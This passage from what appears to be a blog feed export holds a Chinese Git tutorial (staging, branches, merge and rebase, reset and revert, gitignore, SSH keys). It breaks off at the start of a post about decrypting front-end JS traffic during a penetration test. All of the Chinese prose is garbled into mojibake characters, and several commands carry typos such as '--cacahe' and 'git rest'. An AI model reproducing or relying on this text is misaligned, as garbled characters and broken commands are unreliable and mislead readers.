<li>æš‚å­˜åŒºâ€“Staging Areaï¼šä¿å­˜ä¸‹æ¬¡æäº¤çš„æ–‡ä»¶ç›®å½•ï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªç´¢å¼•</li>
<li>ä¸‰ä¸ªæ¦‚å¿µ<ul>
<li>å·²æäº¤ï¼šGitç›®å½•ä¸­ä¿å­˜ç€çš„ç‰¹å®šç‰ˆæœ¬æ–‡ä»¶</li>
<li>å·²æš‚å­˜ï¼šåšäº†ä¿®æ”¹å¹¶æ”¾åœ¨æš‚å­˜åŒº</li>
<li>å·²ä¿®æ”¹ï¼šåšäº†ä¿®æ”¹ä½†è¿˜æ²¡æœ‰æ”¾åˆ°æš‚å­˜åŒº</li>
</ul>
</li>
<li>è¿œç¨‹ä»“åº“â€“Remoteï¼šå¤šäººæ“ä½œçš„ä»“åº“</li>
</ul>
<p><img src="./images/git/1-Git%E4%BB%93%E5%BA%93-1.PNG" alt="1-Gitä»“åº“-1"></p>
<p><img src="./images/git/1-Git%E4%BB%93%E5%BA%93-2.PNG" alt="1-Gitä»“åº“-2"></p>
<h3 id="0X01-Gitçš„åŸºæœ¬æ“ä½œ"><a href="#0X01-Gitçš„åŸºæœ¬æ“ä½œ" class="headerlink" title="0X01 Gitçš„åŸºæœ¬æ“ä½œ"></a>0X01 Gitçš„åŸºæœ¬æ“ä½œ</h3><h5 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h5><ul>
<li>ä¸‹è½½git OXSç‰ˆæœ¬ï¼ˆä¸€èˆ¬ä¸ºå†…ç½®/brew install gitå®‰è£…ï¼‰</li>
<li>ä¸‹è½½git WindowSç‰ˆæœ¬ï¼ˆGitç½‘é¡µä¸‹è½½Gitï¼‰</li>
<li>ä¸‹è½½git Linuxç‰ˆæœ¬ï¼ˆapt-get install git-all/yum -y install gitï¼‰</li>
</ul>
<h5 id="Gitçš„åŸºæœ¬å‘½ä»¤"><a href="#Gitçš„åŸºæœ¬å‘½ä»¤" class="headerlink" title="Gitçš„åŸºæœ¬å‘½ä»¤"></a>Gitçš„åŸºæœ¬å‘½ä»¤</h5><ul>
<li>â–² æäº¤åˆ°è¿œç¨‹ä»“åº“éœ€è¦åœ¨Githubä¸Šåˆ›å»ºä¸€ä¸ªä»“åº“</li>
<li>Gitçš„ç‰ˆæœ¬<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šgit version</code></strong></li>
</ul>
</li>
<li>Gitçš„ç”¨æˆ·ä¿¡æ¯<ul>
<li>åå­—ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit config --global user.name &quot;tomas&quot;</code></strong></li>
<li>é‚®ç®±ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit config --global user.email &quot;643008933@qq.com&quot;</code></strong></li>
<li>é…ç½®æ–‡ä»¶ï¼š~/.gitconfigï¼ˆå¯è®¾ç½®ä»£ç†ï¼Œé…ç½®ä¿¡æ¯ï¼‰</li>
</ul>
</li>
<li>Gitçš„åŸºæœ¬å‘½ä»¤<ul>
<li>åˆå§‹åŒ–ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit init</code></strong></li>
<li>ä»“åº“çŠ¶æ€ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit status</code></strong></li>
<li>æ·»åŠ æ–‡ä»¶åˆ°æš‚å­˜åŒºç®¡ç†ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit add æ–‡ä»¶å</code></strong><ul>
<li>-Aï¼Œæ‰€æœ‰æ–‡ä»¶</li>
</ul>
</li>
<li>ä»æš‚å­˜åŒºåˆ é™¤æ–‡ä»¶ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit rm --cacahe æ–‡ä»¶å</code></strong></li>
<li>æŸ¥çœ‹æ–‡ä»¶ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼š..git â†’ cat index</code></strong></li>
<li>æäº¤ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit commit -m &quot;æ–‡ä»¶å&quot;</code></strong><ul>
<li>-mï¼šæè¿°æäº¤çš„å†…å®¹</li>
</ul>
</li>
<li>å»ºç«‹è¿æ¥ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit remote add origin https://.....</code></strong></li>
<li>æŸ¥çœ‹è¿œç«¯ä¿¡æ¯ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit remote -v</code></strong></li>
<li>æäº¤æœ¬åœ°æ–‡ä»¶åˆ°è¿œç«¯æœåŠ¡å™¨ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit push origin master -u</code></strong><ul>
<li>originï¼šè¿œç«¯ä»“åº“åç§°</li>
<li>masterï¼šæœ¬åœ°ä»“åº“åç§°</li>
<li>-uï¼šåç»­ä¸éœ€è¦è¾“å…¥åç§°</li>
<li>:master ï¼šåˆ é™¤è¿œç«¯çš„åˆ†æ”¯</li>
<li>master:m1 ï¼šæ›´æ”¹è¿œç«¯åˆ†æ”¯åç§°ä¸ºm1</li>
</ul>
</li>
<li>å…‹éš†è¿œç¨‹ä»“åº“åˆ°æœ¬åœ°ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit clone https://..... git-demo</code></strong><ul>
<li>git-demoï¼šä¸ºæ‹‰å–åˆ°æœ¬åœ°ä»“åº“çš„åç§°</li>
</ul>
</li>
<li>æ‹‰å–è¿œç«¯ä»“åº“ä¿®æ”¹æ•°æ®åˆ°æœ¬åœ°ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit pull origin master</code></strong><ul>
<li>originï¼šè¿œç«¯ä»“åº“åç§°</li>
<li>masterï¼šæœ¬åœ°ä»“åº“åç§°</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="Git-tutorial-Repository"><a href="#Git-tutorial-Repository" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>mkdir git-tutorial</li>
<li>cd git-tutorial</li>
<li>git init</li>
<li>ll</li>
<li>touch README.md</li>
<li>git status</li>
<li>git add README.md</li>
<li>git status</li>
<li>git rm â€“cacahe README.md</li>
<li>git status</li>
<li>git add README.md -A</li>
<li>git status</li>
<li>git commit -m â€œREADME.mdâ€</li>
<li>git remote add origin <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>..</li>
<li>git remote -v</li>
<li>git push origin master -u</li>
<li>æŸ¥çœ‹Githubæ˜¯å¦æœ‰æ–°å»ºä¸€ä¸ªä»“åº“å¹¶æœ‰README.md</li>
<li>cd ..</li>
<li>git clone https://â€¦ git-demo</li>
<li>vim README.md</li>
<li>Hello world â†’ wq</li>
<li>git status</li>
<li>git add README.md</li>
<li>git commit -m â€œmodify README.mdâ€</li>
<li>cd ..</li>
<li>cd git-tutorial</li>
<li>git pull origin master</li>
<li>æŸ¥çœ‹Githubå»ºç«‹çš„ä»“åº“ä¸­çš„README.mdæ˜¯å¦æœ‰å†…å®¹</li>
</ul>
<h3 id="0X02-Gitçš„åˆ†æ”¯"><a href="#0X02-Gitçš„åˆ†æ”¯" class="headerlink" title="0X02 Gitçš„åˆ†æ”¯"></a>0X02 Gitçš„åˆ†æ”¯</h3><ul>
<li>ç‰ˆæœ¬å‘å¸ƒã€åŠŸèƒ½å¢åŠ ã€é”™è¯¯ä¿®æ”¹</li>
</ul>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-1.PNG" alt="3-Gitåˆ†æ”¯-1"></p>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-2.PNG" alt="3-Gitåˆ†æ”¯-2"></p>
<ul>
<li>åˆ†æ”¯å‘å¸ƒåˆå¹¶</li>
</ul>
<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-3.PNG" alt="3-Gitåˆ†æ”¯-3"></p>
<h5 id="Gitåˆ†æ”¯æ“ä½œ"><a href="#Gitåˆ†æ”¯æ“ä½œ" class="headerlink" title="Gitåˆ†æ”¯æ“ä½œ"></a>Gitåˆ†æ”¯æ“ä½œ</h5><ul>
<li>åˆ›å»ºåˆ†æ”¯ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit branch åˆ†æ”¯å</code></strong><ul>
<li>åŸºäºæŸä¸ªåˆ†æ”¯åˆ›å»ºçš„åˆ†æ”¯ï¼Œä¼šå¤åˆ¶å…¶å†…å®¹</li>
</ul>
</li>
<li>æŸ¥çœ‹åˆ†æ”¯ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit branch</code></strong></li>
<li>è·³è½¬åˆ†æ”¯ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit checkout åˆ†æ”¯å</code></strong>   </li>
<li>åˆ›å»ºåˆ†æ”¯å¹¶è·³è½¬ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit checkout -b åˆ†æ”¯å</code></strong></li>
<li>åˆ é™¤åˆ†æ”¯ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit branch -d åˆ†æ”¯å</code></strong><ul>
<li>â–² æ— åˆå¹¶åˆ°masterçš„åˆ†æ”¯æ— æ³•åˆ é™¤ï¼Œæˆ–è€…ä½¿ç”¨-Då‚æ•°`**</li>
</ul>
</li>
<li>åˆå¹¶åˆ†æ”¯ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit merge åˆ†æ”¯å</code></strong></li>
</ul>
<h5 id="Git-tutorial-Repository-1"><a href="#Git-tutorial-Repository-1" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>cd git-tutorial</li>
<li>git branch feature1</li>
<li>git branch</li>
<li>git checkout feature1</li>
<li>touch a.txt</li>
<li>vim a.txt</li>
<li>this is a.txt â†’ wq</li>
<li>git add a.txt</li>
<li>git commit -m â€œa.txtâ€</li>
<li>git branch feature2</li>
<li>git checkout feature2</li>
<li>git checkout -b feature3</li>
<li>git branch</li>
<li>git branch -d feature2</li>
<li>touch b.txt</li>
<li>vim b.txt</li>
<li>this is b.txt â†’ wq</li>
<li>git add b.txt</li>
<li>git commit -m â€œb.txtâ€</li>
<li>git checkout master</li>
<li>git branch -d feature3</li>
<li>git merge feature3</li>
<li>git push</li>
<li>æŸ¥çœ‹Githubä»“åº“æ˜¯å¦æœ‰a.txtå’Œb.txtï¼Œä½†æ— å…¶ä»–åˆ†æ”¯</li>
<li>git branch feature1</li>
<li>git push origin feature1</li>
<li>æŸ¥çœ‹Githubä»“åº“æ˜¯å¦æœ‰feature1åˆ†æ”¯</li>
<li>git push origin :feature1</li>
<li>æŸ¥çœ‹Githubä»“åº“æ˜¯å¦æ— feature1åˆ†æ”¯</li>
<li>git push origin feature1:f1</li>
<li>æŸ¥çœ‹Githubä»“åº“çš„feature1æ˜¯å¦æ›´æ”¹ä¸ºf1</li>
</ul>
<h3 id="0X03-Gitçš„åˆå¹¶"><a href="#0X03-Gitçš„åˆå¹¶" class="headerlink" title="0X03 Gitçš„åˆå¹¶"></a>0X03 Gitçš„åˆå¹¶</h3><ul>
<li>â–² å¯ä»¥åœ¨Stackoverflowä¸Šçœ‹git logå¤šæ ·æ ¼å¼</li>
<li>â–² rebaseçš„é»„é‡‘æ³•åˆ™ï¼šç»å¯¹ä¸è¦åœ¨å…¬å…±åˆ†æ”¯ä½¿ç”¨rebase</li>
<li>æŸ¥çœ‹æ—¥å¿—ï¼šgit log<ul>
<li>â€“onelineï¼šä¸€è¡Œçš„æäº¤ä¿¡æ¯</li>
<li>â€“oneline -3ï¼šåªå–å‰é¢3è¡Œ</li>
</ul>
</li>
<li>æŸ¥çœ‹æ·»åŠ çš„å†…å®¹ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit show å“ˆå¸Œå€¼</code></strong></li>
<li>æŸ¥çœ‹æäº¤æ–¹å¼ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit merge --help</code></strong><ul>
<li>â€“ffï¼ˆfast-forwardï¼‰ï¼šé»˜è®¤ä¸äº§ç”Ÿä¸€æ¬¡commit</li>
<li>â€“no-ffï¼šäº§ç”Ÿä¸€ä¸ªcommit</li>
</ul>
</li>
<li>ç§»åŠ¨åˆ†æ”¯ï¼Œå¹¶å°†masteråˆ†æ”¯çš„æäº¤å¹¶å…¥ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit rebase</code></strong></li>
<li>æŸ¥çœ‹ç‰ˆæœ¬åˆ†æ”¯æŠ¥é”™æƒ…å†µï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit mergetool</code></strong><ul>
<li>é€šè¿‡å·¥å…·ä¿®æ”¹åï¼Œä¼šç”Ÿæˆä¸€ä¸ªx.txt.origï¼Œä¿å­˜å†²çªçš„ç°åœº</li>
</ul>
</li>
</ul>
<blockquote>
<p>   mergeå’Œrebase<br>   mergeï¼šä¸¤ä¸ªåˆ†æ”¯çš„ä¿®æ”¹æäº¤ï¼Œé»˜è®¤ä¸æäº¤ï¼Œå…³æ³¨ç‚¹åœ¨åˆå¹¶æ“ä½œä¸Š<br>   rebaseï¼šå°†å½“å‰åˆ†æ”¯åšçš„ä¿®æ”¹ï¼Œå¤åˆ¶åœ¨ç›®æ ‡åˆ†æ”¯çš„æœ€åä¸€æ¬¡ä¸­ï¼Œå…³æ³¨ç‚¹åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸Š </p>
</blockquote>
<h5 id="Git-tutorial-Repository-2"><a href="#Git-tutorial-Repository-2" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>cd git-tutorial</li>
<li>git branch -d f1</li>
<li>git push origin :f1</li>
<li>git log</li>
<li>q</li>
<li>git log â€“oneline</li>
<li>git log â€“oneline -3</li>
<li>git show d156c23</li>
<li>vi ~/.config â†’ dog = log â€“all â€“decorate â€“oneline â€“graph</li>
<li>git dog</li>
<li>git checkout -b f1</li>
<li>touch fa.txt</li>
<li>git add fa.txt</li>
<li>git commit -m â€œadd faâ€</li>
<li>git dog</li>
<li>git checkout master</li>
<li>git merge f1</li>
<li>git dog</li>
<li>git checkout f1</li>
<li>touch fb.txt</li>
<li>git commit -m â€œadd fbâ€</li>
<li>git checkout f1</li>
<li>git merge f1 â€“no-ff</li>
<li>git dog</li>
<li>git push</li>
<li>git push origin f1</li>
<li>è¿œç¨‹ä¿®æ”¹masterä¸­çš„a.txt</li>
<li>git pull</li>
<li>git checkout f1</li>
<li>git merge master</li>
<li>git dog</li>
<li>git checkout master</li>
<li>touch m1.txt</li>
<li>git add m1.txt</li>
<li>git commit -m â€œadd m1â€</li>
<li>git checkout f1</li>
<li>git dog</li>
<li>git rebase</li>
<li>git dog</li>
<li>git checkout -b f2</li>
<li>vim a.txt</li>
<li>this is b.txt</li>
<li>git add a.txt</li>
<li>git commit -m â€œupdate a.txtâ€</li>
<li>git checkout f1</li>
<li>vi a.txt</li>
<li>this is c.txt</li>
<li>git add a.txt</li>
<li>git commit -m â€œupdate c.txtâ€</li>
<li>git checkout f2</li>
<li>git merge f1</li>
<li>cat a.txt</li>
<li>git mergetool</li>
<li>rm a.txt.orig</li>
<li>git commit -m â€œupdate a.txtâ€</li>
<li>git dog</li>
</ul>
<h3 id="0X04-Gitçš„å›æ»šæ’¤é”€"><a href="#0X04-Gitçš„å›æ»šæ’¤é”€" class="headerlink" title="0X04 Gitçš„å›æ»šæ’¤é”€"></a>0X04 Gitçš„å›æ»šæ’¤é”€</h3><ul>
<li>è¿”å›å‰ä¸€æ¬¡çš„è®°å½•ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit reset master^/~5/hashå€¼id</code></strong><ul>
<li>^ï¼šæ¯ä¸€ä¸ª^ç¬¦å·æ ‡è¯†[å‰ä¸€æ¬¡]ï¼Œå¦‚^^^è¡¨ç¤ºå›é€€ä¸‰æ¬¡</li>
<li><del>ï¼šå›é€€æ¬¡æ•°åŠ åœ¨åé¢ï¼Œå¦‚</del>5</li>
<li>hashå€¼idï¼šå›é€€åˆ°idå·çš„ç‰ˆæœ¬</li>
<li>â€“mixï¼šæŠŠæš‚å­˜åŒºçš„æ–‡ä»¶ä¸¢å¼ƒï¼Œä½†ä¸ä¼šåŠ¨åˆ°å·¥ä½œç›®å½•çš„æ–‡ä»¶ï¼ˆé»˜è®¤æ–¹å¼ï¼‰</li>
<li>â€“softï¼šå·¥ä½œç›®å½•è·Ÿæš‚å­˜åŒºçš„æ–‡ä»¶éƒ½ä¸ä¼šè¢«ä¸¢å¼ƒ</li>
<li>â€“hardï¼šä¸ç®¡æ˜¯å·¥ä½œç›®å½•ä»¥åŠæš‚å­˜åŒºçš„æ–‡ä»¶éƒ½ä¼šä¸¢å¼ƒ</li>
</ul>
</li>
<li>æ‰€æœ‰çš„æ—¥å¿—æ–‡ä»¶ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit reflog</code></strong></li>
<li>æ’¤é”€æŸæ¬¡æ“ä½œï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit revert</code></strong><ul>
<li>æ­¤æ¬¡æ“ä½œä¹‹å‰å’Œä¹‹åçš„commitå’Œhistoryéƒ½ä¼šä¿ç•™ï¼Œå¹¶ä¸”æŠŠè¿™æ¬¡æ’¤é”€ä½œä¸ºä¸€æ¬¡æœ€æ–°çš„æäº¤</li>
</ul>
</li>
<li>â–² åœ¨å…¬ç”¨åˆ†æ”¯ä¸Šåº”ç”¨revertï¼Œåœ¨ç§ç”¨åˆ†æ”¯ä¸Šç”¨reset</li>
</ul>
<blockquote>
<pre><code>resetå’Œrevert
revertï¼šç”¨ä¸€æ¬¡æ–°çš„commitæ¥å›æ»šä¹‹å‰çš„commit
resetï¼šåªæ˜¯å°†æ—§çš„commitæŒ‡é’ˆç§»åŠ¨ï¼Œå¹¶æ— åˆ é™¤æ—§çš„commit</code></pre></blockquote>
<h5 id="Git-tutorial-Repository-3"><a href="#Git-tutorial-Repository-3" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>cd git-tutorial</li>
<li>touch hello.java</li>
<li>git add hello.java</li>
<li>git commit -m â€œhellp.javaâ€</li>
<li>git dog</li>
<li>git reset master^</li>
<li>git status</li>
<li>ll</li>
<li>git add hello.java</li>
<li>git commit -m â€œadd Hello.javaâ€</li>
<li>git dog</li>
<li>git reset cd0309f</li>
<li>git status</li>
<li>git reset â€“hard 7d37397</li>
<li>git status</li>
<li>ll</li>
<li>touch c.txt</li>
<li>git add c.txt</li>
<li>git commit -m â€œadd c.txtâ€</li>
<li>git dog</li>
<li>git reset â€“soft 7d37397</li>
<li>git status</li>
<li>git reflog</li>
<li>git reset â€“hard 00bd027</li>
<li>ll</li>
<li>git rest â€“hard HEAD</li>
<li>git dog</li>
<li>git revert</li>
<li>git log</li>
<li>git revert hashå€¼idï¼ˆCommitçš„IDï¼‰</li>
<li>git dog</li>
</ul>
<h3 id="0X05-gitignore-forkåŒæ­¥"><a href="#0X05-gitignore-forkåŒæ­¥" class="headerlink" title="0X05 gitignore/forkåŒæ­¥"></a>0X05 gitignore/forkåŒæ­¥</h3><ul>
<li>åˆ›å»ºä¸€ä¸ª.gitignoreæ–‡ä»¶ï¼Œä¿å­˜è¦å¿½ç•¥çš„å†…å®¹<ul>
<li>å¿½ç•¥ç³»ç»Ÿç”Ÿæˆçš„æ–‡ä»¶ï¼Œå¦‚IDEçš„é…ç½®</li>
<li>å¿½ç•¥ç¼–è¯‘ç”Ÿæˆçš„ä¸­é—´æ–‡ä»¶ã€å¯æ‰§è¡Œæ–‡ä»¶ç­‰</li>
<li>å¿½ç•¥æ•æ„Ÿçš„é…ç½®æ–‡ä»¶å’Œæœ¬åœ°ä¸æƒ³æäº¤çš„è„šæœ¬</li>
</ul>
</li>
<li>å¸¸ç”¨å‚æ•°<ul>
<li>é…ç½®æ–‡ä»¶ï¼š.settings/</li>
<li>è„šæœ¬æ–‡ä»¶ï¼š*.sh</li>
<li>ä¸Šæ¬¡æ‰€æœ‰txtæ–‡ä»¶ï¼š!*.txt</li>
<li>æŸä¸ªç›®å½•ï¼š/a/*.class</li>
</ul>
</li>
<li>gitignoreç½‘ç«™ï¼š<a href="https://www.gitignore.io" target="_blank" rel="noopener">https://www.gitignore.io</a></li>
<li>æŸ¥çœ‹è¿œç¨‹çš„ç‰ˆæœ¬ä¿¡æ¯ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit remote -v</code></strong></li>
<li>å¢åŠ ä¸€ä¸ªè¿œç¨‹ä»“åº“ä¸Šä¼ æµï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit remote add upstream https://...</code></strong></li>
<li>æ›´æ–°è¿œç¨‹ä»“åº“çš„ç‰ˆæœ¬ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit fetch upstream åˆ†æ”¯å</code></strong><ul>
<li>åˆ†æ”¯åé»˜è®¤çœç•¥ï¼Œåˆ™ä¸ºmasteråˆ†æ”¯</li>
<li>â–² pull = fetch + merge</li>
</ul>
</li>
<li>æŸ¥çœ‹è¿œç¨‹åŸå§‹ä»“åº“çš„åˆ†æ”¯ï¼š<strong><code>ğŸ”ºå‘½ä»¤ï¼šgit branch -r</code></strong></li>
</ul>
<h5 id="Git-tutorial-Repository-4"><a href="#Git-tutorial-Repository-4" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
<li>cd git-tutorial</li>
<li>git add -A .</li>
<li>git commit -m â€œadd gitignoreâ€</li>
<li>git push -f</li>
<li>git clone https://â€¦â€¦awesome</li>
<li>cd awesome</li>
<li>git remote -v</li>
<li>git remote add upstream https://â€¦</li>
<li>git remote -v</li>
<li>git fetch upstream </li>
<li>git branch -r</li>
<li>git rebase upstream/master<ul>
<li>mergeå…³æ³¨çš„æ˜¯æäº¤çš„å†å²ï¼Œå°†ä¸¤æ¬¡æ“ä½œåˆå¹¶ï¼Œä½†æ— æäº¤æ•°æ®ï¼Œrebaseåˆ™è¶³å¤Ÿ</li>
</ul>
</li>
<li>git push</li>
<li>git log</li>
</ul>
<h3 id="0X06-Gitçš„å…å¯†ä¼ é€"><a href="#0X06-Gitçš„å…å¯†ä¼ é€" class="headerlink" title="0X06 Gitçš„å…å¯†ä¼ é€"></a>0X06 Gitçš„å…å¯†ä¼ é€</h3><h5 id="Gitä¼ è¾“çš„åè®®"><a href="#Gitä¼ è¾“çš„åè®®" class="headerlink" title="Gitä¼ è¾“çš„åè®®"></a>Gitä¼ è¾“çš„åè®®</h5><ul>
<li>localåè®®</li>
<li>HTTP(S)åè®®ï¼šéœ€è¦è¾“å…¥è´¦å·å¯†ç </li>
<li>SSHåè®®ï¼šä¸éœ€è¦è¾“å…¥è´¦å·å¯†ç </li>
<li>Gitåè®®</li>
<li><a href="https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">Gitå…å¯†æ¨é€</a></li>
</ul>
<h5 id="SSHåè®®ç™»é™†"><a href="#SSHåè®®ç™»é™†" class="headerlink" title="SSHåè®®ç™»é™†"></a>SSHåè®®ç™»é™†</h5><ul>
<li>åœ¨ä¸ªäººç•Œé¢çš„Settingså¤„</li>
<li>SSH and GPG keys</li>
<li>generating SSH keys</li>
<li>Generating a new SSH key and adding it to the ssh-agent</li>
<li>Windows<ul>
<li>ssh-keygen -t rsa -b 4096 -C â€œ<a href="mailto:643008933@qq.com" target="_blank" rel="noopener">643008933@qq.com</a>â€œ<ul>
<li>Enter a file in which to save the key (/c/Users/you/.ssh/id_rsa):[Press enter]</li>
<li>Enter passphrase (empty for no passphrase): [Type a passphrase]</li>
<li>Enter same passphrase again: [Type passphrase again]</li>
</ul>
</li>
<li>eval $(ssh-agent -s)</li>
<li>ssh-add ~/.ssh/id_rsa</li>
<li>cat ~/.ssh/id_rsa.public</li>
<li>å¤åˆ¶å…¬é’¥åˆ°New SSH Key</li>
</ul>
</li>
<li>git clone with SSH</li>
<li>touch a.txt</li>
<li>git add a.txt</li>
<li>git commit -m â€œadd a.txtâ€</li>
<li>git pushï¼ˆçœ‹æ˜¯å¦éœ€è¦è´¦å·å¯†ç ç™»é™†ï¼‰</li>
<li>â–² 2020.04.14 ä½¿ç”¨SSHåè®®ç™»é™†<ul>
<li>git remote -vï¼šæŸ¥çœ‹git cloneæ–¹å¼ï¼Œå¦‚æœæ˜¯origin <a href="https://github.com......å¼€å¤´å°±è¯´æ˜éœ€è¦è°ƒæ•´" target="_blank" rel="noopener">https://github.com......å¼€å¤´å°±è¯´æ˜éœ€è¦è°ƒæ•´</a></li>
<li>git remote rm originï¼šç§»é™¤åŸæ¥çš„gitæº</li>
<li>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:xxx.gitï¼šæ·»åŠ æ–°çš„gitæºå¤´ï¼ˆåœ°å€ä¿®æ”¹ä¸ºè¦è°ƒæ•´çš„ï¼‰</li>
<li>git remote -vï¼šå†æŸ¥çœ‹gitæ–¹å¼ï¼Œå¦‚æœæ˜¯origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>â€¦.å°±å¼€å¤´å°±è¯´æ˜OKäº†ï¼Œé‡æ–°commitæˆ–è€…pushå°±ä¸ç”¨æ¯æ¬¡éƒ½è¾“å…¥è´¦å·å¯†ç äº†</li>
</ul>
</li>
</ul>
<h3 id="0X07-Gitçš„å·¥ä½œæµ"><a href="#0X07-Gitçš„å·¥ä½œæµ" class="headerlink" title="0X07 Gitçš„å·¥ä½œæµ"></a>0X07 Gitçš„å·¥ä½œæµ</h3><ul>
<li><a href="https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md" target="_blank" rel="noopener">Gitå·¥ä½œæµæŒ‡å—</a></li>
<li>é›†ä¸­å¼å·¥ä½œæµ</li>
<li>åŠŸèƒ½åˆ†æ”¯å·¥ä½œæµ</li>
<li>Gitflowå·¥ä½œæµ</li>
<li>Forkingå·¥ä½œæµ</li>
</ul>
<h3 id="0X08-å¸¸ç”¨å·¥å…·"><a href="#0X08-å¸¸ç”¨å·¥å…·" class="headerlink" title="0X08 å¸¸ç”¨å·¥å…·"></a>0X08 å¸¸ç”¨å·¥å…·</h3><ul>
<li>sourcetree</li>
<li>vscode</li>
<li>gitå›¾æ ‡ï¼š<a href="https://gitmoji.surge.sh" target="_blank" rel="noopener">https://gitmoji.surge.sh</a></li>
</ul>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
  </entry>
  <entry>
    <title>ä»ä¸€æ¬¡å‰ç«¯jsåŠ å¯†å†åˆ°mitmä¸­é—´äººè„šæœ¬</title>
    <url>/2020/12/13/js_to_mitmproxy/</url>
    <content><![CDATA[<h2 id="ä»ä¸€æ¬¡å‰ç«¯jsåŠ å¯†å†åˆ°mitmä¸­é—´äººè„šæœ¬"><a href="#ä»ä¸€æ¬¡å‰ç«¯jsåŠ å¯†å†åˆ°mitmä¸­é—´äººè„šæœ¬" class="headerlink" title="ä»ä¸€æ¬¡å‰ç«¯jsåŠ å¯†å†åˆ°mitmä¸­é—´äººè„šæœ¬"></a>ä»ä¸€æ¬¡å‰ç«¯jsåŠ å¯†å†åˆ°mitmä¸­é—´äººè„šæœ¬</h2><h3 id="0X00-å‰ç«¯JSåŠ å¯†çš„åŠ è§£å¯†"><a href="#0X00-å‰ç«¯JSåŠ å¯†çš„åŠ è§£å¯†" class="headerlink" title="0X00 å‰ç«¯JSåŠ å¯†çš„åŠ è§£å¯†"></a>0X00 å‰ç«¯JSåŠ å¯†çš„åŠ è§£å¯†</h3><h4 id="1ã€å‰å› "><a href="#1ã€å‰å› " class="headerlink" title="1ã€å‰å› "></a>1ã€å‰å› </h4><ul>
<li>åœ¨ä¸€æ¬¡æ¸—é€æµ‹è¯•ä¸­ï¼Œé¡¹ç›®ç»ç†ç»™äº†ä¸€æ‰¹å°ç¨‹åºçš„èµ„äº§ï¼Œåœ¨æŒ–æ´çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªæµé‡åŠ å¯†çš„ç‚¹ï¼Œå› ä¸ºä»¥å‰çœ‹è¿‡å¾ˆå¤šæ–‡ç« é€šè¿‡åˆ†æjsæ–‡ä»¶æ¥å®ç°åŠ è§£å¯†æ•°æ®ï¼Œè‡ªå·±ä¹Ÿæƒ³æ¥å®æˆ˜ä¸€ä¸‹é€šè¿‡åˆ†æjsæ–‡ä»¶æ¥å®ç°åŠ è§£å¯†<ul>
<li>è°¢å…¬å­çš„æ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247486046&idx=1&sn=e529bd2e2e781cb3def94225e2e3e863&chksm=eaad8a63ddda0375efd13f4df685d26bffe6ab29cee006ee2a43943cad2de80c98a4923864e0&mpshare=1&scene=1&srcid=1207cJo0qLHhjril5xmW6Kvi&sharer_sharetime=1607352511438&sharer_shareid=13de7cf246df94cfb693d05988b76aac&key=41897554b8f6847ed8cfccee66c19bd9540ee8deb6d245378561f9771d6c0900ac6656056db1cb710da3a96f9fff53e26778ebca5b8bdb9ed6cde840a767cac7d2c83546be85abe9675edd1755fa3a01fb4960bd5f16eaacfb30dc2be9abcf93a03af13a0391a107b76ddabf5c4f1c5e71804bb6df28018ae76fda9721aabe85&ascene=1&uin=MjYzNzU1MTExOQ%3D%3D&devicetype=Windows+10+x64&version=6300002f&lang=zh_CN&exportkey=A3p7YMO5z2%2B7s6erXBDQ8iY%3D&pass_ticket=j3w8TlVmPs9N80MO5TFJBD7B5UBteDVgYV%2F8ZHp9b5yGtAXAvTP9pPL5H0yBeKHA&wx_header=0" 